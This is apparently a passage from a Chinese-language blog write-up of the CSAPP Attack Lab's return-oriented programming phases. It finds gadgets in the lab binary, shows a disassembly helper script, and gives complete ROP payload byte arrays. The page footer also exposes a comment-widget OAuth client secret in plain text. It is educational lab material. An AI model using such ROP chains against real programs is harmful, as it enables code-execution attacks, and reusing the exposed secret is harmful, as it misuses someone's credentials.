<p>所以，要修改rdi寄存器的值，必然要找到<code>popq</code>或<code>movq &lt;&gt;, %rdi</code>指令。结合我们ctarget部分所学习到的代码注入，可以得知，需要执行的指令不一定是程序中存在的某一条指令，也可以是某个连续的字节码（即某条指令的一部分，或者多条指令的中间部分）恰好满足我们需要的指令的字节码。</p>
<p>因此利用gcc得到了下列指令，我们在farm中搜寻满足我们需要指令的字节。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:	48 89 f7             	mov    %rsi,%rdi</span><br><span class="line">3:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">6:	48 89 07             	mov    %rax,(%rdi)</span><br><span class="line">9:	48 8b 38             	mov    (%rax),%rdi</span><br><span class="line">c:	48 8b 3a             	mov    (%rdx),%rdi</span><br><span class="line">f:	48 8b 7c 70 02       	mov    0x2(%rax,%rsi,2),%rdi</span><br><span class="line">14:	89 c7                	mov    %eax,%edi</span><br><span class="line">16:	58                   	pop    %rax</span><br><span class="line">17:	5f                   	pop    %rdi</span><br></pre></td></tr></table></figure>

<p>最终找到了addval_273函数包含所需的机器码<code>48 89 c7 c3</code>。而且<code>5f c3</code>并不存在，这样就没办法直接通过栈来给rdi寄存器赋值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 addval_273:</span><br><span class="line">  4019a0: 8d 87 48 89 c7 c3            	leal	-1010333368(%rdi), %eax</span><br><span class="line">  4019a6: c3                           	retq</span><br></pre></td></tr></table></figure>

<p>这样就可以通过rax寄存器来给rdi寄存器赋值了。接着搜索<code>58 c3</code>，利用pop指令来给rax寄存器赋值。但是这个值并没搜到，最接近一个值为<code>58 90 c3</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019ca getval_280:</span><br><span class="line">  4019ca: b8 29 58 90 c3               	movl	$3281016873, %eax</span><br><span class="line">  4019cf: c3                           	retq</span><br></pre></td></tr></table></figure>

<p>这里我编写了一个脚本来查看我们输入的字节码对应的指令是什么。大致作用就是利用capstone引擎，来实现从控制台读取16进制字符串，从而解析成对应的汇编指令。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>):</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sys.argv)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">30</span> + <span class="string">f&quot;<span class="subst">&#123;t:03&#125;</span>&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">30</span>)</span><br><span class="line">    CODE = <span class="built_in">bytes</span>.fromhex(sys.argv[t])</span><br><span class="line">    md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">    md.syntax = CS_OPT_SYNTAX_ATT</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;CODE: <span class="subst">&#123;CODE&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;i.address:x&#125;</span>:\t<span class="subst">&#123;i.mnemonic&#125;</span>\t<span class="subst">&#123;i.op_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>

<p>利用python脚本对指令的解析结果如下。可以看到多出来的<code>90</code>对应的是nop指令，它是一个空指令，因此可以忽视。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416201507156.png" class="">

<p>这样，我们同时获取到了<code>popq %rax</code>和<code>movq %rax, %rdi</code>指令。现在我们只需要将cookie的值送入栈中，并设置好返回地址即可完成。</p>
<p>构造payload：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">    <span class="number">0xCC</span>, <span class="number">0x19</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// ret addr -&gt; popq %rax</span></span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x97</span>, <span class="number">0xb9</span>, <span class="number">0x59</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// cookie</span></span><br><span class="line">    <span class="number">0xA2</span>, <span class="number">0x19</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// ret addr -&gt; movq %rax, %rdi</span></span><br><span class="line">    <span class="number">0xEC</span>, <span class="number">0x17</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// ret addr -&gt; touch2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416203857581.png" class="">

<h3 id="Touch-3-1"><a href="#Touch-3-1" class="headerlink" title="Touch 3"></a>Touch 3</h3><p>根据ctarget的信息，我们要想办法把一个字符串写入栈中，并且将字符串的地址送入rdi寄存器。</p>
<p>首先我们要想办法，把栈中的一个地址送入寄存器。因为我们的字符串是存在栈中的，要获得栈某个位置的地址，要么对esp寄存器使用add或sub指令，然后再通过mov指令将地址送入寄存器；要么直接利用lea指令来计算一个有效地址，送入寄存器。</p>
<p>在farm中发现，add_xy函数的指令是满足我们需要的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 add_xy:</span><br><span class="line">  4019d6: 48 8d 04 37                  	leaq	(%rdi,%rsi), %rax</span><br><span class="line">  4019da: c3                           	retq</span><br></pre></td></tr></table></figure>

<p>但是我们还需要找到能够操作rsi寄存器的指令。由于这个指令在farm的字符中找不到，所以我们借助工具<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>来搜索这个指令。通过工具在main函数的末尾找到了我们需要的这个指令。<code>5e</code>代表的是<code>popq %rsi</code>指令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">401382: 41 5e                        	popq	%r14</span><br><span class="line">401384: c3                           	retq  </span><br></pre></td></tr></table></figure>

<p>因为我假设了栈地址是随机化的，所以还需要找到获取rsp值的指令。所幸在farm中存在这么一个指令<code>48 89 e0</code>对应的是<code>movq %rsp, %rax</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401aab setval_350:</span><br><span class="line">  401aab: c7 07 48 89 e0 90            	movl	$2430634312, (%rdi)</span><br><span class="line">  401ab1: c3                           	retq</span><br></pre></td></tr></table></figure>

<p>至此我们已经拥有了如下指令：</p>
<ul>
<li><p>地址4019a2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>地址4019cc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">nop</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
</li>
<li><p>地址4019d6</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leaq (%rdi,%rsi), %rax</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
</li>
<li><p>地址401383</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq %rsi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
</li>
<li><p>地址401aad</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp, %rax</span><br><span class="line">nop</span><br><span class="line">retq</span><br></pre></td></tr></table></figure></li>
</ul>
<p>因此根据上述信息构造我们的payload：</p>
<p><strong>这里千万要注意，编写好的指令，最终进入touch3的时候，一定要满足栈指针是16Bytes对齐的，不然sprintf函数对栈进行check时会出错。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	movq %rsp, %rax</span></span><br><span class="line"><span class="comment">	movq %rax,%rdi</span></span><br><span class="line"><span class="comment">	popq %rsi</span></span><br><span class="line"><span class="comment">	leaq (%rdi,%rsi), %rax</span></span><br><span class="line"><span class="comment">	movq %rax,%rdi</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">char</span> buf[] = &#123;</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">    <span class="number">0xAD</span>, <span class="number">0x1A</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// ret addr -&gt; movq %rsp, %rax</span></span><br><span class="line">    <span class="number">0xAD</span>, <span class="number">0x1A</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// ret addr -&gt; movq %rsp, %rax，无意义的执行，为了使栈对齐</span></span><br><span class="line">    <span class="number">0xA2</span>, <span class="number">0x19</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// ret addr -&gt; movq %rax, %rdi</span></span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0x13</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// ret addr -&gt; popq %rsi</span></span><br><span class="line">    <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// rsi value -&gt; 48</span></span><br><span class="line">    <span class="number">0xD6</span>, <span class="number">0x19</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// ret addr -&gt; leaq (%rdi,%rsi), %rax</span></span><br><span class="line">    <span class="number">0xA2</span>, <span class="number">0x19</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// ret addr -&gt; movq %rax, %rdi</span></span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x18</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// ret addr -&gt; touch3</span></span><br><span class="line">    <span class="number">0x35</span>, <span class="number">0x39</span>, <span class="number">0x62</span>, <span class="number">0x39</span>, <span class="number">0x39</span>, <span class="number">0x37</span>, <span class="number">0x66</span>, <span class="number">0x61</span>,  <span class="comment">// 字符串</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// 填充字符</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最后成功通过！</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416234915313.png" class="">

<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>对于touch3，不管是哪种攻击方式都可能出现如下错误。就算反复确认传入的指令是正确的，并且传入touch3时一切如预期执行，但是依然会出现这个错误。</p>
<img src="/2021/04/17/CSAPP-Lab-Attack-Lab/image-20210416235205795.png" class="">

<p>经过我的反复检查，最后发现是由于中间利用了ret指令，而ret指令会修改rsp的值（相当于执行了pop），这就导致了栈指针不一定是16 Bytes对齐的。</p>
<p>如果栈指针不是16 Bytes对齐的，在执行到hexmatch函数内部的sprintf函数时，会调用一个___sprintf_chk函数来确认栈。也正是它，在栈不是对齐的时候，会引发segment fault错误。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">WriteUp</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85619">【技术分享】ROP技术入门教程</a></p>
<p>[3] <a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>CSAPP Lab -- Attack Lab</p><p><a href="https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/">https://rlyown.github.io/2021/04/17/CSAPP-Lab-Attack-Lab/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Chaos Chen</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2021-04-17</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2023-06-30</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/CSAPP/">CSAPP</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/05/08/CLion%E5%9F%BA%E4%BA%8EDocker%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CLion基于Docker远程开发</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/04/12/CSAPP-Lab-Bomb-Lab/"><span class="level-item">CSAPP Lab -- Bomb Lab</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Commentaires</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "f097f0267dd342db341dd42371da9afb",
            repo: "rlyown.github.io",
            owner: "Rlyown",
            clientID: "0dc9a246a80c473e7d31",
            clientSecret: "08612f9152910db6288e61191a4221bad6aea8e5",
            admin: ["Rlyown"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 20,
            pagerDirection: "last",
            
            
            enableHotKey: true,
            language: "zh-CN",
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#ctarget-–-CI"><span class="level-left"><span class="level-item">1</span><span class="level-item">ctarget – CI</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Touch-1"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">Touch 1</span></span></a></li><li><a class="level is-mobile" href="#Touch-2"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">Touch 2</span></span></a></li><li><a class="level is-mobile" href="#Touch-3"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">Touch 3</span></span></a></li></ul></li><li><a class="level is-mobile" href="#rtarget-–-ROP"><span class="level-left"><span class="level-item">2</span><span class="level-item">rtarget – ROP</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Touch-1-1"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">Touch 1</span></span></a></li><li><a class="level is-mobile" href="#Touch-2-1"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">Touch 2</span></span></a></li><li><a class="level is-mobile" href="#Touch-3-1"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">Touch 3</span></span></a></li></ul></li><li><a class="level is-mobile" href="#问题"><span class="level-left"><span class="level-item">3</span><span class="level-item">问题</span></span></a></li><li><a class="level is-mobile" href="#参考资料"><span class="level-left"><span class="level-item">4</span><span class="level-item">参考资料</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/f7.png" alt="Real Own" height="28"></a><p class="is-size-7"><span>&copy; 2023 Chaos Chen</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">Visité par <span id="busuanzi_value_site_uv">0</span> utilisateurs</span></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-hans");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Retour au sommet" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "Ce site Web utilise des cookies pour améliorer votre expérience.",
          dismiss: "Je l'ai!",
          allow: "Autorise les cookies",
          deny: "Déclin",
          link: "Apprendre encore plus",
          policy: "Politique relative aux cookies",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Sans titre)","posts":"Articles","pages":"Pages","categories":"Catégories","tags":"Tags"});
        });</script></body></html>